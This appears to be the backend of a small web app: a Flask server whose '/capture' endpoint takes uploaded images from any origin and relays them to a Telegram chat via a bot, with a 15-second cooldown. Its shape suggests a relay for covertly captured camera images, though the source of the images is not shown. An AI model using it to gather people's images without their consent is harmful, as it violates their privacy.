import time
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # allow frontend requests

# ==============================
# TELEGRAM CONFIG
# ==============================
BOT_TOKEN = os.getenv("BOT_TOKEN")  # set in Railway
CHAT_ID = os.getenv("CHAT_ID")      # set in Railway

if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN or CHAT_ID missing")

# ==============================
# RATE LIMIT CONFIG
# ==============================
LAST_SENT = 0
COOLDOWN_SECONDS = 15   # send max 1 image every 15 sec

# ==============================
# HEALTH CHECK
# ==============================
@app.route("/")
def health():
    return "Backend is running ✅", 200

# ==============================
# CAPTURE ENDPOINT
# ==============================
@app.route("/capture", methods=["POST"])
def capture():
    global LAST_SENT

    if "image" not in request.files:
        return jsonify({"error": "No image"}), 400

    now = time.time()
    if now - LAST_SENT < COOLDOWN_SECONDS:
        return jsonify({"status": "skipped (cooldown)"}), 200

    image = request.files["image"]

    try:
        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={"chat_id": CHAT_ID},
            files={"photo": image},
            timeout=10
        )

        print("📨 Telegram response:", response.status_code, response.text)

        if response.status_code == 200:
            LAST_SENT = now
            return jsonify({"status": "sent"}), 200
        else:
            return jsonify({"status": "telegram_failed"}), 500

    except Exception as e:
        print("❌ Telegram error:", e)
        return jsonify({"error": str(e)}), 500


# ==============================
# START SERVER
# ==============================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
